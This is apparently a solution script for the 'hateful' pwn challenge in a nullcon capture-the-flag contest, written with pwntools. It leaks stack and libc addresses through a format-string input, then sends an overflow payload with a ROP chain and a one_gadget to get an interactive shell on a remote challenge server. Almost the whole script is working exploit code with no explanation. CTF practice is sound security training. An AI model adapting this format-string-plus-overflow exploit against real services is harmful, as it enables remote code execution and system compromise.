# https://ctf.nullcon.net/challenges
# pwn:hateful

from pwn import *

context.arch = "amd64"
# context.log_level = 'error'

binary_path = "./hateful"

# libc_path = "./libc.so.6"
libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(libc_path, checksec=False)

bin = ELF(binary_path, checksec=False)
puts_plt = bin.plt['puts']
print(f'puts@plt: {hex(puts_plt)}')

puts_got = bin.got['puts']
print(f'puts@got: {hex(puts_got)}')

POP_RAX_OFFSET = 0x0016a9ea
POP_RDI_OFFSET = 0x0017a3cf
POP_RSI_OFFSET = 0x0014fa60
POP_RDX_OFFSET = 0x0011d050
POP_RBX_OFFSET = 0x0017ae61
SYSCALL = 0x00151a5d

gdbsc = """
b *send_message+168
b *send_message+185
continue
"""

# p = gdb.debug("./ld-linux-x86-64.so.2 --library-path . ./hateful", gdbscript=gdbsc)
# p = process("./ld-linux-x86-64.so.2 --library-path . ./hateful", shell=True)
p = remote("52.59.124.14", port=5020)

p.sendline(b'yay')
sleep(0.1)

p.sendline(b'%146$lx|%171$lx')
p.recvuntil(b'email provided: ')
sleep(0.1)

rbp = int(p.recv(12).decode(), base=16)
print(f'RBP: {hex(rbp)}')
p.recvuntil(b'|')

rsp = rbp - 0x460
print(f'RSP: {hex(rsp)}')

__libc_start_main_133 = int(p.recv(12).decode(), base=16)
LIBC_BASE = __libc_start_main_133 - 133 - 0x27280
print(f'LIBC BASE: {hex(LIBC_BASE)}')

payload = b'A'*0x3f0
payload += p64(rbp)
payload += p64(LIBC_BASE + POP_RAX_OFFSET)
payload += p64(0)
payload += p64(LIBC_BASE + POP_RBX_OFFSET)
payload += p64(0)
payload += p64(LIBC_BASE +  0x4c139) # one_gadget

p.sendline(payload)

# while True:
#   pass
p.interactive()
